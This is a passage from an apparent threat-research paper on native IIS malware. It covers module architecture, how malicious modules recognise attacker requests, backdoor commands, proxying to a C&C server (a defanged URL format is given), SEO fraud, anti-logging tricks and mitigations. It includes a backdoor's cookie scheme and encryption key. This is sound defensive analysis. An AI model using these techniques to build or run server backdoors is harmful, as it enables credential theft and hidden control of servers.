IIS](https://news.sophos.com/en-us/2021/05/07/new-lemon-duck-variants-exploiting-microsoft-exchange-server/)\n\nserver, which was provided to us from a victim in South Korea.\n\nOn the other hand, another version[5] derived from the same IIS-Raid source code was probably used for\n\ncyberespionage. This version has been used since at least January 2021, targeting only a small number\n\nof high-profile users in Cambodia and Vietnam. The PDB path of the analyzed sample also suggests\n\nthis sample was a part of a targeted campaign: C:\\Users\\cambodia\\Desktop\\ok\\ok\\IIS-Raid```\nmaster\\module\\x64\\Release\\IIS-Backdoor.pdb. In this case, the ProxyLogon vulnerability chain\n\n```\ncould be only one of the possible initial compromise vectors.\n\n4 SHA-256: AA9BA493CB9E9FA6F9599C513EDBCBEE84ECECD6\n5 SHA-256: F449C31AAB9EC0E6C6B2C336DEB83ADE6DAD53FD\n\n\n-----\n\n## 4 ANATOMY OF NATIVE IIS MALWARE\n\nIn this core section of our paper, we dissect the architecture of native IIS modules and explain how\n\nthreat actors fit their malicious functionality into this architecture.\n\n### 4.1 Native IIS malware essentials\n\n[A native IIS module is a dynamic-link library (DLL) writtevn using the IIS C++ API. Native modules are](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/native-code-api-reference)\n\nlocated in the %windir%\\system32\\inetsrv\\[6] folder on the server and can be configured for some,\n\nor for all, applications hosted by the server. These modules can be configured by a command line tool\n```\nAppCmd.exe, via a GUI editor IIS Manager, or by manually editing the %windir%\\system32\\inetsrv\\\n\n```\n**config\\ApplicationHost.config configuration file.**\n\nThe modules are then loaded by the IIS Worker Process (w3wp.exe), which handles requests sent to the\n\nIIS server.\n\n#### 4.1.1 Module class\n\n[In order for IIS to load the DLL successfully, any native IIS module must export the RegisterModule](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/pfn-registermodule-function)\n\nfunction, which is the library entry point, responsible for registering the module for (one or more) server\n\n_events. Events are generated when IIS processes an incoming HTTP request and event handlers are where_\n\nthe core functionality of IIS modules is implemented.\n\n[Therefore, all native IIS modules (malicious or benign) will implement a module class inheriting either](https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis)\n\n[from CHttpModule class, or from CGlobalModule class [13], and will override a number of their event](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/chttpmodule-class)\n\nhandler methods, listed in Figure 4.\n\nFigure 4 // Module class methods of CHttpModule class (left) and CGlobalModule class (right)\n\n6 Or the %windir%\\SysWOW64\\inetsrv\\ folder.\n\n\n-----\n\nThe first step of analyzing a malicious native IIS module is to locate the module class and identify the\n\noverridden methods - this is where the malicious functionality will be implemented. The default method\n\nimplementations are easy to identify, as they only print a debug message, similar to the message\n\nillustrated in Figure 5.\n\n_“This module subscribed to event CHttpModule::OnSendResponse but did not override the method in its CHttpModule_\n\n_implementation. Please check the method signature to make sure it matches the corresponding method.”_\n\nFigure 5 // Default event handler method CHttpModule::OnSendResponse\n\nIn the malware families we examined, the malicious functionality is usually implemented across one to\n\nthree event handlers, with the rest of the methods not overridden. For example, Group 7 implements its\n\nmalicious functionality in the OnBeginRequest, OnLogRequest and OnSendResponse handlers; Group 5\n\nonly overrides the OnPostBeginRequest handler.\n\nHowever, not all implemented handlers are necessarily malicious. For example, Group 12 includes\n\na trojanized version of a legitimate native module called F5 X-Forwarded-For. This module converts\n\nthe X-Forwarded For HTTP header so it’s visible as the client IP address in the IIS logs, which is\n\nimplemented as OnAcquireRequestState, OnSendResponse handlers. Group 12 malware builds its\n\ncode on the same module, with added malicious functionality, as the OnBeginRequest handler.\n\nBoth Group 7 and Group 12 handlers are shown in Figure 6.\n\nFigure 6 // Group 7 (left) and Group 12 (right) event handler methods\n\n\n-----\n\n#### 4.1.2 Request-processing pipeline\n\nAs the previous section explains, the RegisterModule function is responsible for initialization while\n\nmost of the malicious functionality in native IIS malware is found in its event handlers. This section\n\nexplains the significance of these events and when they are triggered.\n\nEvents are steps in which IIS processes all incoming HTTP requests (whether GET, POST or other).\n\nThese steps are taken serially, in the request-processing pipeline illustrated in Figure 7, and each of them\n\n[generates two request-level notifications for the request [10], [14].](https://www.microsoftpressstore.com/articles/article.aspx?p=2231761)\n\nFigure 7 // HTTP request-processing pipeline in IIS\n\nFor example, the first step (BeginRequest event) generates:\n\n- Event notification handled by the OnBeginRequest handler\n\n- Post-event notification handled by the OnPostBeginRequest handler\n\nPost-event notifications are generated immediately after the corresponding request-level event in\n\n[the pipeline. See Microsoft documentation for the full list of request-level notifications. Using these](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/chttpmodule-class)\n\nnotifications, a malicious IIS module can hook any part of the pipeline.\n\nOther notifications are generated when specific, non-deterministic events occur, most notably,\n```\nOnSendResponse handler handles the event when IIS sends the response buffer, which is a step with no\n\n```\nfixed position in the pipeline.\n\nFor malicious modules, the difference between event and post-event request notifications is generally\n\nnot significant (except for some corner cases). In our sample set, the malware generally registers\n\nhandlers at the beginning of the pipeline (to be able to process the incoming requests), and/or when a\n\nresponse is being sent (to be able to intercept or modify it).\n\nFinally, some server events are not tied to individual HTTP requests but occur on the global level. For\n\nexample, the GlobalFileChange event occurs when a file within a web site is changed. Some Group 9\n\nsamples override the CGlobalModule::OnGlobalPreBeginRequest method to process requests\n\n[before they enter the request-processing pipeline. See Microsoft documentation for the full list of global-](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/cglobalmodule-class)\n\nlevel notifications. An IIS module can register for both request-level and global-level notifications, as is\n\nthe case with the Group 9 malware.\n\nMalicious modules will override a combination of these event handler methods, for example to intercept\n\nlegitimate traffic or to handle incoming requests from the C&C server.\n\n\n-----\n\n#### 4.1.3 RegisterModule function\n\n[To summarize, each native IIS module must export the RegisterModule function and implement at least](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/pfn-registermodule-function)\n\n[one of these classes [13]:](https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis)\n\na. To be able to register for request-level notifications:\n\n[A class inheriting from CHttpModule (module class) and a class implementing IHttpModuleFactory (the](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/chttpmodule-class)\n\nfactory class for the module). The factory class is responsible for creating instances of the module for each\n\nincoming HTTP request.\n\nb. To be able to register for global-level notifications:\n\n[A class inheriting from CGlobalModule.](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/cglobalmodule-class)\n\nThe RegisterModule function creates instances of the core classes and registers for events\n\nthat should be handled by the module. This is done by calls to the SetRequestNotifications or\n\n**[SetGlobalNotifications methods on the pModuleInfo instance, respectively, specifying a bitmask](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/request-processing-constants)**\n\nof events to which it will receive notifications. (The bitmask will correspond directly to functions\n\noverridden by the module’s main class.)\n\nFollowing is the RegisterModule function prototype:\n\n```\ntypedef HRESULT(WINAPI* PFN_REGISTERMODULE)(\n  DWORD dwServerVersion,\n  IHttpModuleRegistrationInfo* pModuleInfo,\n  IHttpServer* pGlobalInfo \n);\n\n```\n\nIn the malware families we examined, a typical RegisterModule function is as minimalistic as in Figure 8\n\n(used in Group 1, only registering the OnSendResponse handler).\n\nFigure 8 // A typical RegisterModule function of a native IIS module\n\nOptionally, the RegisterModule function can also set the request-level priority for the module using\n\nthe IHttpModuleRegistrationInfo::SetPriorityForRequestNotification method. For cases\n\nwhen several IIS modules (malicious and regular) are registered for the same event, this priority is used\n\nto enforce the order in which their respective handlers will be called. For example, Group 7 registers its\n\n\n-----\n\nhandlers with PRIORITY_ALIAS_FIRST, as shown in Figure 9. That means that this malicious module\n\nwill be executed before all other modules on BeginRequest and LogRequest events, and after all\n\nother modules on SendRequest event. This allows the malware to have the final word in what response\n\nwill be sent to the HTTP request.\n\nFigure 9 // RegisterModule function example (Group 7)\n\nNote that the RegisterModule function is not necessarily always as minimalistic as in Figure 8. Since\n\nthis function is only executed once, it is a good place for initialization. Figure 10 illustrates the layout of\n\nGroup 9’s RegisterModule function, which decrypts strings and initializes a global map structure to be\n\nused by the handlers.\n\nFigure 10 // A more complex RegisterModule function with initialization functions (Group 9)\n\nIn any case, the only responsibility of the RegisterModule function is to initialize the module and\n\nregister it for server events. To understand a malicious native IIS module, it is crucial to analyze the\n\nhandlers.\n\n\n-----\n\n### 4.2 Native IIS malware features\n\nWhether the IIS malware’s purpose is to steal credential information from legitimate visitors, or serve\n\nthem malicious content, all native IIS modules operate in the same phases. As illustrated in Figure 11,\n\na malicious IIS module starts with parsing an incoming HTTP request to identify whether it was sent by\n\na legitimate user, by the attacker, or another party, and whether it should be processed. According to\n\nthis classification, the malware then processes the request (for example, logs sensitive data from the\n\nrequest or executes backdoor command from the request) and modifies the HTTP response accordingly.\n\nTypically, only a few of the inbound HTTP requests are of interest to the malicious module and will\n\ntrigger an action, the rest of the requests pass through the malware pipeline untouched.\n\nFigure 11 // Typical native IIS malware phases\n\nIn this section, we explore how each of these phases is implemented by IIS handlers.\n\n#### 4.2.1 Parsing HTTP requests\n\nAs the first step for each incoming HTTP request, a malicious IIS module parses the request using\n\n[instances of IHttpContext and IHttpRequest provided as parameters to obtain information such as](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-api-reference/ihttpcontext-interface)\n\nrequested resource, headers or request body. An example is shown in Figure 12.\n\nFigure 12 // Reading HTTP request body (Group 2)\n\n\n-----\n\n[Another way to access HTTP headers is by using IIS Server Variables, which can be used to retrieve a](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524602(v=vs.90))\n\nspecific request (client) header by using the HTTP_<headerName> value. This is a common way to\n\nimplement HTTP request parsing in general – for example, Apache and nginx servers can both provide\n```\nHTTP_<headerName> as environment variables. In IIS, the server variables can be accessed via the\nGetServerVariable method, as shown in Figure 13 where the User-Agent, Referer and Host\n\n```\nheaders are queried. This method of HTTP request parsing is used by Group 6, Group 11 and Group 12.\n\nFigure 13 // Group 11 obtains values of HTTP request headers by querying IIS server variables\n\n#### 4.2.2 Classifying requests\n\nWith the information obtained from the HTTP request, the module can evaluate whether the request\n\nwill be processed or ignored. That means that as the next step, it applies its mechanisms to recognize\n\nwhether the request is coming from the attacker, a legitimate user, or automated bot, as these requests\n\nwill be handled differently.\n\nNote that malicious IIS modules, especially IIS backdoors, don’t usually create new connections to the\n\nC&C servers. They work in passive mode, allowing the attackers to control them by providing some\n\n“secret” in the HTTP request. That’s why these backdoors have a mechanism implemented to recognize\n\nthe attacker requests, which are used to control the server and have a predefined structure.\n\nPossibilities are broad; these are some that were used in the samples analyzed:\n\n- URL or request body matching a specific regex\n\n- A custom HTTP header present\n\n- An embedded token (in the URL, request body or one of the headers) matching a hardcoded password\n\n- A hash value of an embedded token matching a hardcoded value – for example, Group 12 computes\n\nthe MD5 of the password in the request and compares it against a hardcoded value\n\n- A more complex condition – for example, a relationship between all of the above\n\nAs an example of a more complex condition, attacker requests to control Group 7 backdoor must\n\nmatch the expected format, encryption and encoding, and this relationship between the URL, Host and\n```\nCookie headers:\n\n```\n- The malware first computes the MD5 of both the URL and Host header, and splits each into four\n\ndouble words:\n```\n    <h0><h1><h2><h3> = md5(Host Header value)\n    <r0><r1><r2><r3> = md5(Raw URL value)\n\n```\n- Then, it verifies that the Cookie header contains a substring built from these values:\n```\n    <r1><h2>=<h3><r2><r3><r0><h0><h1>\n\n```\n- Figure 14 and Figure 15 illustrate a part of how this substring is assembled\n\n\n-----\n\nFigure 14 // Attacker requests for Group 7 have a specific relationship between the request URL, Host and Cookie headers\n\nFigure 15 // Group 7 backdoor attacker request format\n\nOther malware families are designed to manipulate search engine algorithms, and therefore need\n\na mechanism to recognize requests from search engine crawlers. These are usually recognized by\n\nchecking for specific key words in the User-Agent header, such as:\n\n- 360Spider\n\n- Baiduspider\n\n- Bingbot\n\n- Googlebot\n\n- Sogou Pic Spider\n\n- Sogou web spider\n\n\n-----\n\n- Yahoo\n\n- YandexBot\n\n- YisouSpider…\n\n#### 4.2.3 Processing HTTP requests\n\nAt the next step, the malicious IIS module processes the HTTP requests – various mechanisms are used\n\nbased on the malware type, as described in this section.\n\nInfostealer mode\n\nInfostealing IIS malware intercepts regular traffic between the compromised server and its clients, and\n\nexfiltrates information of interest to the attackers.\n\nOne example is Group 1, which targets HTTP requests with the string password in the request body, to\n\nobtain credentials from legitimate visitors. Note that being a part of the server, these IIS infostealers\n\nhave access to all data, even if SSL/TLS is used and the communication channel is encrypted.\n\nAnother example is malware targeting credit card information sent to e-commerce websites that don’t\n\n[use a payment gateway.](https://en.wikipedia.org/wiki/Payment_gateway)\n\nAs illustrated in Figure 16, Group 5 targets HTTP POST requests made to specific URI paths\n\n(/checkout/checkout.aspx, /checkout/Payment.aspx). When a legitimate website visitor makes\n\nsuch a request (1), the malware logs it into a log file (2), without interfering with the HTTP reply in any\n\nway (3). At a later point, an attacker can make an HTTP request to a specific URI path (e.g. /privacy.aspx),\n\nwith an attacker password included in the X-IIS-Data header (4), to exfiltrate the collected data (5,6).\n\nFigure 16 // Group 5 infostealing mechanism\n\nBackdoor mode\n\nAnother class of IIS malware is IIS backdoors that allow the attacker to remotely control the\n\ncompromised server by sending special HTTP requests with commands. Legitimate HTTP requests are\n\nusually ignored by the IIS backdoors – of course, they are handled by other (legitimate) IIS modules,\n\nas expected.\n\nNote that IIS backdoors are implemented as passive backdoors – the backdoor doesn’t actively request\n\ncommands from the C&C server, it’s the attacker who sends HTTP requests with the commands to the\n\ncompromised IIS server.\n\n\n-----\n\nThe backdoor commands and arguments are passed as part of the URL, in the HTTP request body,\n\nor are embedded in HTTP request headers. As an example, for Group 7, the backdoor commands and\n\narguments are embedded in the HTTP request body as key-value pairs, as shown in Table 2. The body is\n\nAES-CBC encrypted and base64 encoded with these parameters:\n\n- Encryption key: DA1F8BE19D9122F6499D72B90299CAB080E9D599C57E802CD667BF53CCC9EAB2\n\n- IV: 668EDC2D7ED614BF8F69FF614957EF83EE\n\nTable 2 // Group 7 attacker HTTP request body structure\n\n**Key** **Value**\n\n`/mode` Command type\n\n`/action` Command\n\n```\n/path\n/binary\n/data\n…\n\n```\n\nCommand arguments (see Table 3 for full list)\n\n\n`/credential/username` Local user username, used for impersonation\n\n`/credential/password` Local user password, used for impersonation\n\nIf the credentials are present, Group 7 backdoors use them to log in as that user (via LogonUserW,\n```\nImpersonateLoggedOnUser API functions) to execute the backdoor commands on their behalf.\n\n```\nThe backdoor supports the commands listed in Table 3. The details about these commands and their\n\narguments are listed in Table 9 in the Group 7 section of the Appendix. As can be seen from Table 3, few of\n\nthis backdoor’s features are specific to IIS – it mostly supports standard backdoor commands such as:\n\n- Get system information\n\n- Upload/download files\n\n- Execute files or shell commands\n\n- Create reverse shell\n\n- Create/list/move/rename/delete files and folders\n\n- Map local drives to remote drives\n\n- Exfiltrate collected data\n\nThis also applies to the other analyzed IIS backdoor families.\n\n\n-----\n\nTable 3 // Group 7 backdoor commands\n\n**Command type (/** **Command**\n**Command description**\n**mode value)** **(/action value)**\n\nCollects basic system information: computer name and domain,\n`init` N/A\nusername and domain, logical drives information.\n\n`list` Collects information about the files in the specified folder.\n\nDownloads the file with the specified name from the compromised\n```\n           get\n```\nIIS server.\n\nCreates a new file or directory in the specified path. Optional\n```\n           create\n```\narguments can hold the file content.\n\n\n**file**\n\n\nUploads a file with the specified name to the compromised server.\n```\nupload\n```\nThe arguments include a base64-encoded file content.\n\n`delete` Deletes the list of files/directories in the given path.\n\nCopies or renames files from the list, from the source directory to the\n```\nmove\n```\ndestination directory.\n\n`time` Modifies file timestamps.\n\n\nCreates a mapping between a local and a remote drive, using the\n```\n                map\n```\ngiven credentials for the network resource.\n```\n     drive\n\n```\n`remove` Removes existing drive mapping.\n\nExecutes the specified command, either under the context of\n`cmd` `exec` the current user, or the user provided in arguments. Returns the\ncommand output.\n\nProxy mode\n\nIIS proxies turn the compromised IIS servers into malicious proxies, and program them to forward\n\nrequests from compromised hosts. These are a special type of malicious IIS modules, in that these\n\nmodules are usually a part of a bigger infrastructure. Attackers may deploy this malware on\n\n[compromised servers in order to build a multi-layer C&C infrastructure [15], or the IIS server can act like](https://attack.mitre.org/versions/v9/techniques/T1090/002/)\n\n[an internal proxy [16] between the C&C server and compromised machines located in a local corporate](https://attack.mitre.org/versions/v9/techniques/T1090/001/)\n\nnetwork.\n\nAs shown in Figure 17, the malicious IIS module recognizes a request from the compromised host (1),\n\nrelays it to the C&C server (2), and then relays the obtained commands to the compromised host (3-4).\n\nOf course, the compromised IIS server doesn’t necessarily have to communicate directly with the real\n\nC&C server: there can be other intermediaries to make the tracing even more difficult.\n\nFigure 17 // C&C communication leveraging a compromised IIS server as a proxy\n\n\n-----\n\nFor example, one[7] of the Group 9 samples implements the proxy functionality in this way:\n\n1. A compromised client makes an HTTP GET request to the compromised IIS server, with URI path\n\nmatching this regular expression: ^/(app|hot|alp|svf|fkj|mry|poc|doc|20)\n\n2. The malicious IIS module on the server sends an HTTP GET request to the C&C server, in this format:\n```\n http://qp.008php[.]com/<path>|<hostHeader>|<token>| where <path> and <hostHeader>\n\n```\nare the URI path and Host header from the original request, and <token> is the matched string from\n\nthe regular expression (e.g. alp). The client IP address from the original request is also included in the\n\nheaders, and some other headers are copied from the original request (Accept-Encoding, Referer)\n\n3. The C&C server processes the request and sends a response (e.g. backdoor commands) to the\n\ncompromised IIS server\n\n4. The malicious IIS module clears any HTTP response that could have been set by other IIS modules in the\n\nrequest-processing pipeline and replaces it with the data from the C&C server. Thus, it relays the response\n\nfrom the C&C server (e.g., backdoor commands) to the compromised client, without revealing the C&C\n\nserver’s IP address\n\nNote that only specific requests (coming from compromised clients) are relayed to the C&C server;\n\nrequests from legitimate clients of the IIS server are handled normally by the server.\n\nThis technique has several advantages for the attackers:\n\n- Using a compromised server for C&C communication can bypass detection by firewall and some other\n\nmechanisms, as the compromised server may have a good reputation\n\n- Even if malware analysts or security products extract IoCs from the malicious sample, they won’t\n\npoint to the real C&C server\n\nOn the negative side, since the attackers don’t own the server, it may become a single point of failure\n\nand prevent victims from reaching the real C&C server if the compromised one is cleaned.\n\nSeveral sophisticated threat actors have used internal or external proxies in the past (for example,\n\n[GreyEnergy [17] or Duqu2 [18]), and IIS proxies are now another example of how this technique can be](https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/)\n\nimplemented.\n\nSEO fraud mode\n\nAnother category of IIS malware that we analyzed has an uncommon goal and targets - instead of\n\naffecting legitimate visitors of the compromised IIS server, it is used to deceive search engine crawlers.\n\nGroups 9–14 modify content served to search engine crawlers, in order to artificially boost SEO for\n\nselected websites (we refer to these techniques collectively as unethical SEO or SEO fraud, although you\n\n[may know the common term black hat SEO). The most versatile family, Group 13, supports these modes:](https://blog.hubspot.com/marketing/black-hat-seo)\n\n- Redirecting the search engines to the particular website chosen by the attacker, effectively making\n\n[the compromised website a doorway page](https://developers.google.com/search/docs/advanced/guidelines/doorway-pages)\n\n- Injecting a list of backlinks (pre-configured or obtained from the C&C server on the fly) into the HTTP\n\nresponse, to artificially boost its relevance/popularity (also parasitizing on the compromised website’s\n\nranking)\n\nNote that the legitimate visitors of the compromised server will still be served the expected content,\n\nso the users and the webmaster may fail to notice that something is wrong with the server.\n\n7 SHA-1: BD98ABC510AC3DF66E21C3CDCEE7BDFC1A326AC5\n\n\n-----\n\nGroup 10 uses another technique from this category:\n\n- When a search engine web crawler is detected, this IIS module serves an HTML response with meta\n\nkeywords and meta description tags stuffed with keywords referring to a particular WeChat racing\n\ngroup, and a JavaScript script\n\n- The keywords are shown in Figure 18 and correspond to Chinese Unicode strings, e.g. 北京赛车微信群,\n\n北京微信赛车群,北京赛车微信群,PK10群,北京8d5b车pk10微信群 that loosely translate to “Beijing Racing\n\nWeChat Group, Beijing WeChat Racing Group, Beijing Racing WeChat Group, PK10 Group, Beijing 8d5b\n\nCar Pk10 WeChat Group”\n\n- [The purpose of the keyword stuffing could be to make the particular racing group appear more popular,](https://developers.google.com/search/docs/advanced/guidelines/irrelevant-keywords)\n\nand rank higher when searching for a group of this type\n\nFigure 18 // Strings used to deceive search engine crawlers (Group 10)\n\nNote that it is possible that some webmasters willingly implement similar IIS modules with unethical\n\nSEO techniques to boost their own SEO statistics. Even if that were the case and the users were aware\n\nof installing these modules, it is usually against the guidelines of search engines to serve their crawlers a\n\n[different version of the website than is served to the users [19], [20].](https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines)\n\nHowever, the samples discussed in this report are not this case, as they all implement a communication\n\nchannel with a C&C server to obtain configuration data (i.e., which website should be linked, etc.); and\n\nmost of them also implement other malicious functionality (backdoor, proxy). We believe the attackers\n\nmisuse the compromised IIS servers for this scheme, which they offer as a service to third parties.\n\nInjector mode\n\nAs a final IIS malware type, IIS injectors are used to manipulate the content served to the legitimate\n\nvisitors of the websites hosted by the compromised IIS server. For example, Group 12 replaces content\n\ndisplayed to visitors coming from search engines (based on keywords in the Referer header), and\n\nvisitors browsing specific URIs with data obtained from the C&C server. This could include malicious\n\nscripts, advertisements or malicious redirects. Part of the configuration of this malware is shown in Figure 19.\n\n\n-----\n\nFigure 19 // Group 12 processes HTTP requests based on keywords in URIs or Referer headers\n\nThe mechanism behind IIS injectors is usually implemented in the same way as the one behind SEO\n\nfraud IIS malware – the malicious IIS module recognizes HTTP requests of interest, and injects data\n\nobtained from the C&C server into the HTTP response. The reason we consider it a separate malware\n\ntype is in the affected parties:\n\n- For SEO fraud malware, the modified content is served to search engine crawlers and it’s the SERP\n\nalgorithms that are manipulated\n\n- IIS injectors serve malicious content to the legitimate visitors, and could be used for displaying ads,\n\n[mass-spreading of any malware, but also for watering hole attacks targeting specific groups of users](https://attack.mitre.org/versions/v9/techniques/T1189/)\n\n#### 4.2.4 Modifying HTTP responses\n\nIn the previous sections, we described how various types of malicious IIS modules parse, classify and\n\nprocess inbound HTTP requests of various types. In this section, we cover the final phase – how IIS\n\nmodules can modify or replace the HTTP response for these requests.\n\nMalicious IIS modules can manipulate the HTTP response (as prepared by other IIS modules), using the\n```\nIHttpContext and IHttpResponse interfaces. For example, after they handle attacker requests, Group 8\n\n```\nbackdoors discard any HTTP response prepared by other IIS modules and replace it with their own.\n\nAs shown in Figure 20, useful methods are IHttpContext::GetResponse, IHttpResponse::Clear,\n```\nIHttpResponse::WriteEntityChunks and others.\n\n```\n\n-----\n\nFigure 20 // Replacing HTTP response with own data (Group 8)\n\nAnother interesting case is Group 9 – in response to search engine web crawler requests, this malware\n\nappends data obtained from the C&C server to the HTTP response prepared by the IIS server.\n\nBut first, before any other modules start processing the request (in its OnBeginRequest handler set to\n\nthe highest priority), this malware removes an Accept-Encoding header, if present, from the original\n\nweb crawler HTTP request, to prevent other IIS modules from using compression. This step is illustrated\n\nin Figure 21.\n\nThis way, the IIS server will not compress the response for this request and the malware can easily inject\n\nadditional data into the response without having to deal with the compression algorithm.\n\nFigure 21 // Group 9 deletes the Accept-Encoding header from the request to prevent other modules from using\ncompression in the HTTP response\n\n\n-----\n\n### 4.3 Anti-analysis and detection evasion techniques\n\nNone of the samples we analyzed use any complex method of obfuscation or other methods to avoid\n\ndetection – we suspect the threat actors didn’t implement these mechanisms because IIS servers often\n\nlack security solutions anyway, and because IIS malware is not that common or commonly analyzed.\n\nHowever, it is important to note that even without additional obfuscations implemented, some features\n\nof native IIS malware make analysis and detection harder implicitly:\n\n- IIS API is based on C++ classes, rather than on Windows API functions, which can thwart some simple\n\ndetection methods.\n\n- The default C&C mechanism is “passive”: the attacker sends a specific HTTP request to the\n\ncompromised IIS server (for example with backdoor commands), and the malicious IIS module embeds\n\nthe response in the HTTP response to this request. This makes it difficult to identify C&C servers\n\nwithout logs from the compromised server, as no C&C server is hardcoded in those samples.\n\nA couple of notable evasion techniques used by the analyzed IIS malware families follow; a summary of\n\nthe techniques used can be found in Table 4 (Section 4.4).\n\n#### 4.3.1 Obfuscation techniques\n\nSome samples implement simple measures such string stacking, string encryption, UPX packing, or\n\nmimicking legitimate IIS modules. For example, Group 12 mimics a legitimate F5XFFHttpModule.dll\n\nmodule, while, as shown in Figure 22, one Group 5 samples uses a forged VERSIONINFO resource to\n\nmimic a legitimate Windows IIS module called dirlist.dll.\n\nFigure 22 // Group 5 VERSIONINFO resource (left) mimics legitimate dirlist.dll module (right)\n\n#### 4.3.2 C&C communication\n\nFew samples used encryption for C&C communication; however, Group 7 uses an interesting technique\n\nof embedding C&C communication in a fake PNG file, in an attempt to blend into regular network\n\ntraffic. Furthermore, Group 11 uses DNS TXT records to obtain configuration data from the C&C server\n\n(via the DnsQuery_A API), to make the request look less suspicious, as shown in Figure 23.\n\n\n-----\n\nFigure 23 // Group 11 uses DNS records to obtain its configuration\n\n#### 4.3.3 Anti-logging features\n\nThe most notable evasion techniques used by the IIS malware families we analyzed are measures to\n\nprevent the attacker requests from being logged on the compromised server, and thus to hide traces of\n\nmalicious activities.\n\n[As Palo Alto Networks researchers demonstrated in their RGDoor blogpost [4]: with default settings, the](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/)\n```\nCookie header is not logged on IIS (because it may be large and contain sensitive information). Group 4\n\n```\n(RGDoor), as well as some variants of Group 1, embed backdoor commands in the Cookie header.\n\nMoreover, Group 7 uses a technique to prevent the server from logging attacker requests, regardless\n\nof the server settings. It implements the OnLogRequest handler, which will be called as part of the\n\nrequest-processing pipeline, just before the IIS server logs a processed HTTP request. If the malware\n\ndetects a request from the attacker, this handler will “sanitize” the log entry:\n\n- It rewrites the HTTP method in the request to GET\n\n- It rewrites the resource from the request to /\n\n- It deletes these headers from the request: Cookie, Origin, Referer, Sec-Fetch-Mode, Sec-Fetch```\n Site, Content-Type, Content-Length, X-Forwarded-IP, X-Forwarded-For, X-Forwarded-By,\n X-Forwarded-Proto\n\n```\nPart of this handler is shown in Figure 24:\n\n\n-----\n\nFigure 24 // Group 7 modifies log entries for attacker requests\n\n\n-----\n\n### 4.4 Summary table\n\nTable 4 summarizes key features of the analyzed IIS malware families. For detailed analyses of Groups 1–14,\n\nplease refer to the Appendix of this paper.\n\nTable 4 // Summary of obfuscations implemented, and functionalities supported by analyzed IIS malware families\n\n\n**Functionality**\n\n\n**C&C channel**\n\n\n**Attacker request verification**\n**(e.g. specific header present,**\n**specific URI, query string**\n**parameter)**\n\n\n**Detection**\n**evasion and**\n**obfuscation**\n**techniques**\n\n|Group #|Backdoor|Infostealer|Proxy|SEO fraud|Injector|(e.g. specific header present,  specific URI, query string  parameter)|Encryption/ encoding|Alternative channel protocol|evasion and obfuscation techniques|\n|---|---|---|---|---|---|---|---|---|---|\n|Group 1||||||HTTP header with hardcoded password|base64|||\n|Group 2||||||HTTP header with hardcoded password|RSA + AES- CBC|||\n|Group 3||||||HTTP header present|base64|||\n|Group 4||||||HTTP header with hardcoded password|XOR + base64||Anti-logging|\n|Group 5||||||URI and HTTP header with hardcoded password|||String stacking|\n|Group 6||||||Query string parameter||||\n|Group 7||||||Relationship between HTTP headers, HTTP body format|AES-CBC||Anti-logging|\n|Group 8||||||HTTP header with hardcoded password||||\n|Group 9||||||No support for attacker requests||HTTP|Encrypted strings (XOR 0x56)|\n|Group 10||||||No support for attacker requests||HTTP to obtain JavaScript config||\n|Group 11||||||HTTP header with hardcoded password||DNS TXT to obtain config, HTTP for C&C|String encryption (ADD 0x02)|\n|Group 12, variant A||||||HTTP header with password whose MD5 hash is hardcoded||HTTP|String encryption (ADD 0x01)|\n|Group 12, variant B||||||||HTTP|UPX packing|\n|Group 12, variant C||||||No support for attacker requests||HTTP|String encryption (XOR 0x0C)|\n|Group 13||||||Query string parameter||HTTP||\n|Group 14||||||No support for attacker requests||HTTP||\n\n\n-----\n\n## 5 MITIGATION\n\nIn this part, we discuss measures that could be used to prevent the compromise of IIS servers, and how\n\nto navigate the IIS server to detect and remove native IIS malware.\n\n### 5.1 Preventing compromise of IIS servers\n\nSince native IIS modules can only be installed with administrative privileges, the attackers first need to\n\nobtain elevated access to the IIS server. The following recommendations could help make their work\n\nharder:\n\n- Use dedicated accounts with strong, unique passwords for the administration of the IIS server.\n\nRequire MFA for these accounts. Monitor the usage of these accounts.\n\n- Regularly patch your OS, and carefully consider which services are exposed to the internet, to reduce\n\nthe risk of server exploitation.\n\n- Consider using a web application firewall, and/or endpoint security solution on your IIS server.\n\n- Native IIS modules have unrestricted access to any resource available to the server worker process;\n\nyou should only install native IIS modules from trusted sources to avoid downloading their trojanized\n\nversions. Be especially aware of modules promising too-good-to-be-true features such as magically\n\nimproving SEO.\n\n- Regularly check the configuration file\n\n**%windir%\\system32\\inetsrv\\config\\ApplicationHost.config, as well as the**\n```\n %windir%\\system32\\inetsrv\\ and %windir%\\SysWOW64\\inetsrv folders to verify that all the\n\n```\ninstalled native modules are legitimate (signed by a trusted provider, or installed on purpose).\n\nFor web developers: If you don’t have the control over the IIS server where your web service is hosted,\n\nthese measures can’t be applied by you. However, you can still take steps to reduce the impact on users\n\nof your web service in the case of a compromise, especially:\n\n- Do not send credentials to the server (not even over SSL/TLS); use cryptographically strong one-way\n\nsalted hashes on the client side. IIS infostealers are a good example why server-side hashing is not\n\ngood enough.\n\n- Avoid unnecessary sending sensitive information from the web application; use payment gateways.\n\n[Please refer to OWASP [23]](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content) _[[24] for more comprehensive information on secure web development](https://owasp.org/www-project-proactive-controls/)_\n\npractices.\n\n### 5.2 Detecting compromised IIS servers\n\nAll native IIS modules are configured in the %windir%\\system32\\inetsrv\\config\\ApplicationHost.config\n\nconfiguration file, and should be installed in the %windir%\\system32\\inetsrv\\ or the\n```\n%windir%\\SysWOW64\\inetsrv folder. To check whether your IIS server has been compromised with\n\n```\nnative IIS malware, verify that all the installed modules are 